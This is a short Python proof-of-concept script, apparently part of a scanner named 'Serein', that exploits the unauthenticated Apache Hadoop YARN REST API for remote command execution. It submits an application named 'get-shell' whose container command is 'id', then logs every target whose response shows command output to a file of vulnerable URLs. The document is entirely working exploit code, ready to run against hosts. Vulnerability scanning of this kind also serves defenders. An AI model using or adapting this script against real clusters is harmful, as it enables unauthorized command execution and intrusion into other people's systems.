import requests
def Apache_Hadoop_Yarn_RPC_RCE_POC(url):
    poc = r"""/ws/v1/cluster/apps"""
    url1 = url + poc
    headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Content-Length": "167",
            "Content-Type": "application/json",
            "User-Agent": "Serein v2.7"
        }
    data = {"application-id": "application_1655112607010_0005", "application-name": "get-shell", "am-container-spec": {"commands": {"command": "id"}}, "application-type": "YARN"}

    try:
        res = requests.post(url=url1, headers=headers,json=data,verify=False,timeout=3)
        if "groups=" in res.text:
            print("【！！！！！！】存在Apache Hadoop Yarn RPC 远程命令执行漏洞的url：" + url1 + "\n")
            with open ("存在Apache Hadoop Yarn RPC 远程命令执行漏洞的url.txt", 'a') as f:
                f.write(url1 + "\n")
            f.close()
        else:
            print("【----------】不存在Apache Hadoop Yarn RPC 远程命令执行漏洞：" + url1 + "\n")
    except Exception as e:
        pass